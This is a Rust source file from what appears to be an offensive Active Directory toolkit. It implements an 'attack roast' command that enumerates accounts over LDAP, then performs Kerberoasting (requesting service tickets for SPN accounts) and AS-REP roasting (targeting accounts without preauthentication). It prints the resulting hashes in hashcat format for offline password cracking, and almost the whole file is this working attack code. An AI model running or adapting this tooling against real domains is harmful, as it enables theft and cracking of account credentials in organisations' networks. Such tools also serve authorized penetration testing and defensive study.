//! `attack roast` — Kerberoast (SPN → TGS-REP RC4/AES) + AS-REP roast
//! (no-preauth accounts) hashcat output. Reuses `ScanArgs` since the
//! collector needs an identical LDAP + KDC config.

use adhammer_collector::Collector;
use anyhow::Result;

use crate::attacks::scan::{config, ScanArgs};
use crate::ui;

pub(crate) async fn roast(a: ScanArgs) -> Result<()> {
    let mut checklist = ui::StageChecklist::new([
        "LDAP collect",
        "classify candidates",
        "Kerberoast SPNs",
        "AS-REP roast",
    ]);
    let result = roast_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("Roast stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("Roast stages (failed)");
        }
    }
    result
}

async fn roast_impl(a: ScanArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    checklist.record_ok("LDAP collect", format!("{} object(s)", snap.objects.len()));

    let realm = snap
        .domain
        .domain_dn
        .split(',')
        .filter_map(|p| p.strip_prefix("DC="))
        .collect::<Vec<_>>()
        .join(".")
        .to_uppercase();
    let (kerberoast, asrep) = adhammer_kerberos::candidates(&snap, &realm);
    checklist.record_ok(
        "classify candidates",
        format!(
            "{} Kerberoastable · {} AS-REP roastable",
            kerberoast.len(),
            asrep.len()
        ),
    );

    println!("== Kerberoastable ({}) ==", kerberoast.len());
    let mut kerberoast_ok = 0u32;
    let mut kerberoast_err = 0u32;
    match &a.kdc {
        None => {
            for c in &kerberoast {
                println!("  {}  spn={}", c.sam, c.spn.as_deref().unwrap_or("-"));
            }
        }
        Some(kdc) if !kerberoast.is_empty() => {
            // One authenticated TGT, then a TGS-REQ per SPN.
            match adhammer_kerberos::get_tgt(&a.auth.user, &a.auth.password, &realm, kdc).await {
                Err(e) => {
                    eprintln!("  TGT acquisition failed: {e}");
                    kerberoast_err += kerberoast.len() as u32;
                }
                Ok(tgt) => {
                    for c in &kerberoast {
                        let spn = c.spn.as_deref().unwrap_or_default();
                        match adhammer_kerberos::roast_spn(&tgt, &c.sam, spn, kdc).await {
                            Ok(hash) => {
                                println!("{hash}");
                                kerberoast_ok += 1;
                            }
                            Err(e) => {
                                eprintln!("  {}: {e}", c.sam);
                                kerberoast_err += 1;
                            }
                        }
                    }
                }
            }
        }
        Some(_) => {}
    }
    checklist.record_ok(
        "Kerberoast SPNs",
        if a.kdc.is_some() {
            format!("{kerberoast_ok} hash(es) · {kerberoast_err} error(s)")
        } else {
            "listed only (no --kdc)".to_string()
        },
    );

    println!("== AS-REP roastable ({}) ==", asrep.len());
    let mut asrep_ok = 0u32;
    let mut asrep_err = 0u32;
    match &a.kdc {
        None => {
            for c in &asrep {
                println!("  {}", c.sam);
            }
            if !asrep.is_empty() {
                eprintln!("(pass --kdc <host> to fetch hashcat 18200 hashes)");
            }
        }
        Some(kdc) => {
            for c in &asrep {
                match adhammer_kerberos::asrep_roast(c, kdc).await {
                    Ok(hash) => {
                        println!("{hash}");
                        asrep_ok += 1;
                    }
                    Err(e) => {
                        eprintln!("  {}: {e}", c.sam);
                        asrep_err += 1;
                    }
                }
            }
        }
    }
    checklist.record_ok(
        "AS-REP roast",
        if a.kdc.is_some() {
            format!("{asrep_ok} hash(es) · {asrep_err} error(s)")
        } else {
            "listed only (no --kdc)".to_string()
        },
    );
    Ok(())
}
